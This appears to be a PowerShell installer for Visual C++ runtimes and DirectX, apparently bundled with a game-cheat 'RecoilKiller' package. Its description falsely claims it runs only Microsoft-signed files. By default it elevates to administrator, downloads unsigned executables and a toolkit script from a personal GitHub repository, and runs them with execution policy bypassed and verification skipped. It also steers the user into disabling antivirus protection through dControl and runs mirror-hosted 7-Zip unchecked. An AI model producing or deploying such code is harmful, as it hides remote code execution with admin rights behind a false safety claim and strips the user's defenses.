#Requires -Version 5.1
<#
.SYNOPSIS
    Complete online installer: Visual C++ 2005-2022 + DirectX (June 2010),
    with optional driver (.inf) and vendor toolkit / VTX steps.

.DESCRIPTION
    This is the merged "complete installation file". It combines the
    "12 C++.ps1" and "11 DirectX.ps1" helpers into one self-contained
    installer that only ever runs files signed by Microsoft: if a local
    copy is not genuinely signed it is refused and downloaded from the
    official Microsoft location instead.

    Flow:
      1. Elevates to Administrator (RunAs) when needed.
      2. Checks internet access.
      3. Installs the Visual C++ runtimes 2005-2022 (x86 + x64), silent.
      4. Installs DirectX (June 2010) silently (7-Zip is installed if missing).
      5. Runs the vendor toolkit Install-Toolkit.ps1 by default, which does the
         protection gate, the .inf driver stage and the VTX enable/verify step
         (disable with -SkipVendorToolkit). Online it downloads the vendor
         package files from -BaseUrl first.
      6. Prints a PASS/FAIL report and writes a log.

.PARAMETER PackageDir
    Folder that holds the package (drivers, VTX tools, Install-Toolkit.ps1).
    Defaults to the folder this script lives in.

.PARAMETER WorkDir
    Cache + log folder. Defaults to %ProgramData%\RecoilKillerSetup\all.

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\Install-All.ps1

.EXAMPLE
    .\Install-All.ps1 -PackageDir "C:\DRIVER"
.EXAMPLE
    .\Install-All.ps1 -SkipVendorToolkit -SkipDirectX
#>
[CmdletBinding()]
param(
    [string]$PackageDir = '',
    [string]$WorkDir    = (Join-Path $env:ProgramData 'RecoilKillerSetup\all'),

    # Base URL that hosts the vendor package (Install-Toolkit.ps1, dControl.exe,
    # 1. VTX\VTX\*.exe, drivers ...). Used when those files are not next to this script.
    [string]$BaseUrl    = 'https://raw.githubusercontent.com/khaledco2/TEST20262/main/',

    [switch]$SkipVCRuntimes,
    [switch]$SkipDirectX,
    [switch]$InstallDrivers,      # stage any .inf in the package (standalone step)
    [switch]$SkipVendorToolkit,   # do NOT run Install-Toolkit.ps1 (VTX / drivers / gate)
    [switch]$FixVTX,              # force the VTX enable tools even if VTX looks active
    [switch]$DisableProtection,   # open dControl and let the user turn protection off
    [switch]$Detailed,
    [switch]$Force
)

$ErrorActionPreference = 'Stop'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
$ProgressPreference = 'SilentlyContinue'

# Resolve the package folder (the folder this script lives in) when not given.
if ([string]::IsNullOrWhiteSpace($PackageDir)) {
    if ($PSScriptRoot) { $PackageDir = $PSScriptRoot }
    elseif ($MyInvocation.MyCommand.Path) { $PackageDir = Split-Path -Parent $MyInvocation.MyCommand.Path }
    else { $PackageDir = (Get-Location).Path }
}

# ---------------------------------------------------------------------------
# Self elevate
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host 'Administrator rights are required - re-launching elevated...' -ForegroundColor Yellow
    $reArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $PSCommandPath,
                '-PackageDir', $PackageDir, '-WorkDir', $WorkDir, '-BaseUrl', $BaseUrl)
    if ($SkipVCRuntimes)     { $reArgs += '-SkipVCRuntimes' }
    if ($SkipDirectX)        { $reArgs += '-SkipDirectX' }
    if ($InstallDrivers)     { $reArgs += '-InstallDrivers' }
    if ($SkipVendorToolkit)  { $reArgs += '-SkipVendorToolkit' }
    if ($FixVTX)             { $reArgs += '-FixVTX' }
    if ($DisableProtection)  { $reArgs += '-DisableProtection' }
    if ($Detailed)           { $reArgs += '-Detailed' }
    if ($Force)              { $reArgs += '-Force' }
    Start-Process -FilePath 'powershell.exe' -ArgumentList $reArgs -Verb RunAs
    exit
}

# ---------------------------------------------------------------------------
# Folders / log
# ---------------------------------------------------------------------------
foreach ($d in @($WorkDir, (Join-Path $WorkDir 'log'), (Join-Path $WorkDir 'cache'))) {
    if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
}
$stamp   = Get-Date -Format 'yyyyMMdd_HHmmss'
$LogFile = Join-Path $WorkDir "log\Install-All_$stamp.log"

$Results = New-Object System.Collections.ArrayList

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = ('[{0}] [{1,-6}] {2}' -f (Get-Date -Format 'HH:mm:ss'), $Level, $Message)
    Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    if ($Detailed -or $Level -in @('ERROR', 'WARN')) {
        $color = switch ($Level) { 'ERROR' { 'Red' } 'WARN' { 'Yellow' } 'OK' { 'Green' } default { 'Gray' } }
        Write-Host $Message -ForegroundColor $color
    }
}

function Write-Con {
    param([string]$Message, [string]$Color = 'White')
    Write-Host $Message -ForegroundColor $Color
    Add-Content -LiteralPath $LogFile -Value $Message -Encoding UTF8
}

function Add-Result {
    param([string]$Requirement, [string]$Status, [string]$Action)
    [void]$Results.Add([pscustomobject]@{ Requirement = $Requirement; Status = $Status; Action = $Action })
    $color = switch ($Status) { 'OK' { 'Green' } 'WARN' { 'Yellow' } default { 'Red' } }
    Write-Host ('  [{0,-7}] {1}  -->  {2}' -f $Status, $Requirement, $Action) -ForegroundColor $color
    Add-Content -LiteralPath $LogFile -Value ('  [{0}] {1} - {2}' -f $Status, $Requirement, $Action) -Encoding UTF8
}

function Test-MicrosoftSigned {
    param([string]$Path)
    try {
        $sig = Get-AuthenticodeSignature -LiteralPath $Path
        if ($sig.Status -ne 'Valid') { return $false }
        return ($sig.SignerCertificate.Subject -match 'O=Microsoft Corporation')
    } catch { return $false }
}

function Test-Internet {
    try {
        Invoke-WebRequest -Uri 'https://www.microsoft.com' -Method Head -UseBasicParsing -TimeoutSec 15 | Out-Null
        return $true
    } catch {
        return [bool](Test-Connection -ComputerName '8.8.8.8' -Count 1 -Quiet -ErrorAction SilentlyContinue)
    }
}

function Get-Remote {
    param([string]$Url, [string]$Dest, [int]$Retries = 3)
    for ($i = 1; $i -le $Retries; $i++) {
        try {
            Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -TimeoutSec 900
            return $true
        } catch {
            Write-Log ("  download attempt {0}/{1} failed: {2}" -f $i, $Retries, $_.Exception.Message) 'WARN'
            Start-Sleep -Seconds 3
        }
    }
    return $false
}

# Fetch a file into the cache. If a genuine (Microsoft-signed) copy is
# already cached it is reused; otherwise download from the official URL,
# falling back to the mirror.
function Get-TrustedFile {
    param([string]$Name, [string]$OfficialUrl, [string]$MirrorUrl)
    $cache = Join-Path $WorkDir "cache\$Name"
    if ((Test-Path -LiteralPath $cache) -and (Test-MicrosoftSigned -Path $cache)) { return $cache }
    if ((Test-Path -LiteralPath $cache) -and -not $Force) { Remove-Item -LiteralPath $cache -Force -ErrorAction SilentlyContinue }

    foreach ($url in @($OfficialUrl, $MirrorUrl)) {
        if ([string]::IsNullOrWhiteSpace($url)) { continue }
        Write-Log "  Downloading $Name from $url"
        if (Get-Remote -Url $url -Dest $cache) {
            if (Test-MicrosoftSigned -Path $cache) { return $cache }
            Write-Log "  Downloaded $Name is NOT Microsoft-signed - discarding." 'ERROR'
            Remove-Item -LiteralPath $cache -Force -ErrorAction SilentlyContinue
        }
    }
    return $null
}

$VC = [ordered]@{
    '2005_x86'                = @{ Url = 'https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x86.exe'; Args = '/Q /C:"msiexec /i vcredist.msi /qn /norestart"' }
    '2005_x64'                = @{ Url = 'https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x64.exe'; Args = '/Q /C:"msiexec /i vcredist.msi /qn /norestart"' }
    '2008_x86'                = @{ Url = 'https://download.microsoft.com/download/9/7/7/977B481A-7BA6-4E30-AC40-ED51EB2028F2/vcredist_x86.exe'; Args = '/q' }
    '2008_x64'                = @{ Url = 'https://download.microsoft.com/download/9/7/7/977B481A-7BA6-4E30-AC40-ED51EB2028F2/vcredist_x64.exe'; Args = '/q' }
    '2010_x86'                = @{ Url = 'https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe'; Args = '/quiet /norestart' }
    '2010_x64'                = @{ Url = 'https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x64.exe'; Args = '/quiet /norestart' }
    '2012_x86'                = @{ Url = 'https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x86.exe'; Args = '/quiet /norestart' }
    '2012_x64'                = @{ Url = 'https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x64.exe'; Args = '/quiet /norestart' }
    '2013_x86'                = @{ Url = 'https://aka.ms/highdpimfc2013x86enu'; Args = '/quiet /norestart' }
    '2013_x64'                = @{ Url = 'https://aka.ms/highdpimfc2013x64enu'; Args = '/quiet /norestart' }
    '2015_2017_2019_2022_x86' = @{ Url = 'https://aka.ms/vs/17/release/vc_redist.x86.exe'; Args = '/quiet /norestart' }
    '2015_2017_2019_2022_x64' = @{ Url = 'https://aka.ms/vs/17/release/vc_redist.x64.exe'; Args = '/quiet /norestart' }
}
$MirrorBase = 'https://github.com/FR33THYFR33THY/Ultimate/releases/download/Files'

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
Write-Con ''
Write-Con ('=' * 52) 'Cyan'
Write-Con '  Complete installer : Visual C++ + DirectX + vendor toolkit' 'Cyan'
Write-Con ('=' * 52) 'Cyan'
Write-Con ("Package : {0}" -f $PackageDir)
Write-Con ("Work    : {0}" -f $WorkDir)
Write-Con ("Machine : {0}" -f $env:COMPUTERNAME)
Write-Con ''
Write-Log "START (admin=$isAdmin) | Package=$PackageDir | Log=$LogFile" 'STEP'

if (-not (Test-Path -LiteralPath $PackageDir)) {
    Add-Result -Requirement 'Package folder' -Status 'FAILED' -Action "not found: $PackageDir"
    Write-Con 'Aborting - package folder not found.' 'Red'
    exit 2
}

if (-not (Test-Internet)) {
    Add-Result -Requirement 'Internet' -Status 'FAILED' -Action 'No connection - online install cannot continue'
    Write-Con 'Aborting - internet connection required.' 'Red'
    exit 3
}
Add-Result -Requirement 'Internet' -Status 'OK' -Action 'Connection available'

$rebootNeeded = $false

# ---------------------------------------------------------------------------
# 1. Visual C++ runtimes
# ---------------------------------------------------------------------------
if ($SkipVCRuntimes) {
    Write-Log 'Visual C++ runtimes skipped (-SkipVCRuntimes).' 'WARN'
} else {
    Write-Con ''; Write-Con 'Visual C++ runtimes 2005-2022' 'Cyan'
    $archs = if ([Environment]::Is64BitOperatingSystem) { @('x86', 'x64') } else { @('x86') }
    $vcOk = 0; $vcFail = 0
    foreach ($key in $VC.Keys) {
        if ($key -notmatch '_x86$' -and [Environment]::Is64BitOperatingSystem -eq $false) { continue }
        $name = "vcredist$key.exe"
        $exe  = Get-TrustedFile -Name $name -OfficialUrl $VC[$key].Url -MirrorUrl "$MirrorBase/$name"
        if (-not $exe) { Write-Log "  Could not obtain a trusted $key installer." 'ERROR'; $vcFail++; continue }
        try {
            $p = Start-Process -FilePath $exe -ArgumentList $VC[$key].Args -PassThru -Wait -WindowStyle Hidden
            switch ($p.ExitCode) {
                0     { Write-Log "  VC++ $key installed" 'OK' }
                3010  { Write-Log "  VC++ $key installed (reboot pending)" 'OK'; $rebootNeeded = $true }
                1638  { Write-Log "  VC++ $key - newer version already present" 'WARN' }
                default { Write-Log "  VC++ $key - exit code $($p.ExitCode)" 'WARN' }
            }
            $vcOk++
        } catch {
            Write-Log "  VC++ $key FAILED : $($_.Exception.Message)" 'ERROR'; $vcFail++
        }
    }
    if ($vcFail -eq 0) { Add-Result -Requirement 'Visual C++ runtimes' -Status 'OK'   -Action "$vcOk installer(s) processed" }
    else               { Add-Result -Requirement 'Visual C++ runtimes' -Status 'WARN' -Action "$vcFail installer(s) failed" }
}

# ---------------------------------------------------------------------------
# 2. DirectX (June 2010)
# ---------------------------------------------------------------------------
if ($SkipDirectX) {
    Write-Log 'DirectX skipped (-SkipDirectX).' 'WARN'
} else {
    Write-Con ''; Write-Con 'DirectX (June 2010)' 'Cyan'

    # 7-Zip is only needed to unpack the DirectX self-extractor.
    $sevenZip = "$env:SystemDrive\Program Files\7-Zip\7z.exe"
    if (-not (Test-Path -LiteralPath $sevenZip)) {
        Write-Log '  Downloading 7-Zip (needed to extract DirectX)...'
        $pkg = Join-Path $WorkDir 'cache\7zip.exe'
        if (Get-Remote -Url "$MirrorBase/7zip.exe" -Dest $pkg) {
            Start-Process -FilePath $pkg -ArgumentList '/S' -Wait
        } else {
            Write-Log '  Could not download 7-Zip.' 'ERROR'
        }
    }

    $dxOk = $false
    if (Test-Path -LiteralPath $sevenZip) {
        $dxPkg = Join-Path $WorkDir 'cache\directx.exe'
        $needDx = -not (Test-Path -LiteralPath $dxPkg) -or $Force
        if ($needDx) {
            Write-Log '  Downloading DirectX...'
            $needDx = -not (Get-Remote -Url "$MirrorBase/directx.exe" -Dest $dxPkg)
        }
        if (Test-Path -LiteralPath $dxPkg) {
            $dxDir = Join-Path $WorkDir 'cache\directx'
            if (Test-Path -LiteralPath $dxDir) { Remove-Item -LiteralPath $dxDir -Recurse -Force -ErrorAction SilentlyContinue }
            Write-Log '  Extracting DirectX...'
            & $sevenZip x $dxPkg -o"$dxDir" -y | Out-Null
            $setup = Join-Path $dxDir 'DXSETUP.exe'
            if (Test-Path -LiteralPath $setup) {
                Write-Log '  Installing DirectX (silent)...'
                Start-Process -FilePath $setup -ArgumentList '/silent' -Wait -WindowStyle Hidden
                $dxOk = $true
            } else {
                Write-Log '  DXSETUP.exe not found after extraction.' 'ERROR'
            }
        } else {
            Write-Log '  Could not download DirectX.' 'ERROR'
        }
    } else {
        Write-Log '  7-Zip is not available - cannot extract DirectX.' 'ERROR'
    }

    if ($dxOk) { Add-Result -Requirement 'DirectX (June 2010)' -Status 'OK'   -Action 'Installed silently' }
    else       { Add-Result -Requirement 'DirectX (June 2010)' -Status 'FAILED' -Action 'Install incomplete - see log' }
}

# ---------------------------------------------------------------------------
# 3. Drivers (.inf)
# ---------------------------------------------------------------------------
if ($InstallDrivers) {
    Write-Con ''; Write-Con 'Drivers (.inf)' 'Cyan'
    $infFiles = @(Get-ChildItem -Path $PackageDir -Recurse -Filter '*.inf' -ErrorAction SilentlyContinue)
    if ($infFiles.Count -eq 0) {
        Add-Result -Requirement 'Driver package' -Status 'MISSING' -Action 'No .inf files found in the package'
    } else {
        $fail = 0
        foreach ($inf in $infFiles) {
            Write-Log ("  pnputil /add-driver `"{0}`" /install" -f $inf.FullName)
            & pnputil.exe /add-driver $inf.FullName /install 2>&1 | ForEach-Object { Write-Log "    $_" 'DATA' }
            if ($LASTEXITCODE -eq 3010) { $rebootNeeded = $true }
            elseif ($LASTEXITCODE -ne 0) { $fail++ }
        }
        if ($fail -eq 0) { Add-Result -Requirement 'Driver package' -Status 'OK'   -Action "$($infFiles.Count) .inf file(s) staged" }
        else             { Add-Result -Requirement 'Driver package' -Status 'WARN' -Action "$fail .inf file(s) returned an error" }
    }
}

# ---------------------------------------------------------------------------
# 4. Optional: vendor toolkit / VTX / protection gate
# ---------------------------------------------------------------------------
if ($DisableProtection) {
    $dControl = Join-Path $PackageDir 'dControl.exe'
    if (Test-Path -LiteralPath $dControl) {
        Write-Con ''; Write-Con 'Protection gate (dControl)' 'Cyan'
        Start-Process -FilePath $dControl
        Add-Result -Requirement 'Protection gate' -Status 'WARN' -Action 'dControl opened - turn protection OFF there if you accept the risk'
    }
}

# The vendor toolkit (Install-Toolkit.ps1) is run by default: it performs the
# protection gate, the driver (.inf) stage and the VTX enable/verify step.
if (-not $SkipVendorToolkit) {
    Write-Con ''; Write-Con 'Vendor toolkit (protection / drivers / VTX)' 'Cyan'

    $vpkg    = $PackageDir
    $toolkit = Join-Path $vpkg 'Install-Toolkit.ps1'

    # When launched by the online one-liner we sit in %TEMP% with no package
    # files, so build a package folder by downloading the vendor files.
    if (-not (Test-Path -LiteralPath $toolkit)) {
        $vpkg = Join-Path $WorkDir 'pkg'
        if (-not (Test-Path -LiteralPath $vpkg)) { New-Item -ItemType Directory -Path $vpkg -Force | Out-Null }
        $vendor = @(
            'Install-Toolkit.ps1',
            'dControl.exe',
            'CMD.exe',
            '13_1.exe',
            '1. VTX\VTX\1. CheckVTX.exe',
            '1. VTX\VTX\2. GiaiPhongVTX.exe',
            '1. VTX\VTX\3. BatVTX.exe'
        )
        foreach ($rel in $vendor) {
            $dest = Join-Path $vpkg $rel
            if (Test-Path -LiteralPath $dest) { continue }
            $dir = Split-Path $dest -Parent
            if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
            $url = $BaseUrl.TrimEnd('/') + '/' + ($rel -replace '\\', '/')
            Get-Remote -Url $url -Dest $dest | Out-Null
        }
        # Hand the toolkit the genuine VC++ runtimes so it does not have to fetch
        # them itself (their hashes differ from the built-in manifest, so the
        # toolkit is invoked with -SkipVerify).
        $vcdir = Join-Path $vpkg 'Visual-C-Runtimes-All-in-One-Oct-2024'
        if (-not (Test-Path -LiteralPath $vcdir)) { New-Item -ItemType Directory -Path $vcdir -Force | Out-Null }
        foreach ($k in $VC.Keys) {
            $dst = Join-Path $vcdir "vcredist$k.exe"
            if (Test-Path -LiteralPath $dst) { continue }
            $src = Join-Path $WorkDir "cache\vcredist$k.exe"
            if (Test-Path -LiteralPath $src) {
                Copy-Item -LiteralPath $src -Destination $dst -Force
            } else {
                $got = Get-TrustedFile -Name "vcredist$k.exe" -OfficialUrl $VC[$k].Url -MirrorUrl "$MirrorBase/vcredist$k.exe"
                if ($got) { Copy-Item -LiteralPath $got -Destination $dst -Force }
                else { Write-Log "  Could not obtain genuine VC++ $k for the vendor package." 'ERROR' }
            }
        }
        $toolkit = Join-Path $vpkg 'Install-Toolkit.ps1'
    }

    if (Test-Path -LiteralPath $toolkit) {
        $tkArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $toolkit,
                    '-Source', $vpkg, '-SkipVerify')
        if ($BaseUrl) { $tkArgs += @('-OnlineBaseUri', $BaseUrl) }
        if ($FixVTX)  { $tkArgs += '-FixVTX' }
        Write-Log "  Running: powershell $($tkArgs -join ' ')"

        # Capture the output so we can read the toolkit's real verdict
        # (it exits 0 even when it prints NOT READY).
        $tkOut = @(& powershell.exe @tkArgs 2>&1)
        foreach ($line in $tkOut) { Write-Host $line }
        $tkExit  = $LASTEXITCODE
        $notReady = [bool](@($tkOut | Where-Object { $_ -like '*NOT READY*' }).Count -gt 0)
        $badItems  = @($tkOut | Where-Object { $_ -match '^\s+-\s+.+' } | ForEach-Object { ($_ -replace '^\s+-\s+', '').Trim() })
        $LogTxt    = (@($tkOut | Where-Object { $_ -match '^Log: (.+?)\s*$' }) | Select-Object -First 1) -replace '^Log: ', ''

        if ($tkExit -eq 2) { Add-Result -Requirement 'Vendor toolkit' -Status 'FAILED' -Action "package files missing or modified - aborted. Log: $LogTxt" }
        elseif ($tkExit -eq 3) { Add-Result -Requirement 'Vendor toolkit' -Status 'FAILED' -Action "protection is still ON - turn it off. Log: $LogTxt" }
        elseif ($notReady) { Add-Result -Requirement 'Vendor toolkit' -Status 'FAILED' -Action ("NOT ready: {0}. Log: {1}" -f (($badItems -join ', '), $LogTxt)) }
        elseif ($tkExit -ne 0) { Add-Result -Requirement 'Vendor toolkit' -Status 'FAILED' -Action "exit code $tkExit. Log: $LogTxt" }
        else { Add-Result -Requirement 'Vendor toolkit' -Status 'OK' -Action "Install-Toolkit.ps1 finished. Log: $LogTxt" }
    } else {
        Add-Result -Requirement 'Vendor toolkit' -Status 'MISSING' -Action 'Install-Toolkit.ps1 could not be obtained'
    }
}

# ---------------------------------------------------------------------------
# 5. Final report
# ---------------------------------------------------------------------------
Write-Con ''
Write-Con ('-' * 52) 'Cyan'
$blocking = @($Results | Where-Object { $_.Status -in @('MISSING', 'FAILED') })
if ($blocking.Count -eq 0) { Write-Con '  RESULT  :  READY  (OK)' 'Green' }
else {
    Write-Con '  RESULT  :  NOT READY  (FAIL)' 'Red'
    foreach ($b in $blocking) { Write-Con ("     - {0}: {1}" -f $b.Requirement, $b.Action) 'Red' }
}
Write-Con ('-' * 52) 'Cyan'
Write-Con ("Log : $LogFile") 'Gray'
if ($rebootNeeded) { Write-Con 'A restart is recommended to finish the installation.' 'Yellow' }
Write-Log 'FINAL REPORT' 'STEP'
foreach ($r in $Results) { Write-Log ("  [{0}] {1} - {2}" -f $r.Status, $r.Requirement, $r.Action) 'DATA' }

exit $(if ($blocking.Count -eq 0) { 0 } else { 1 })
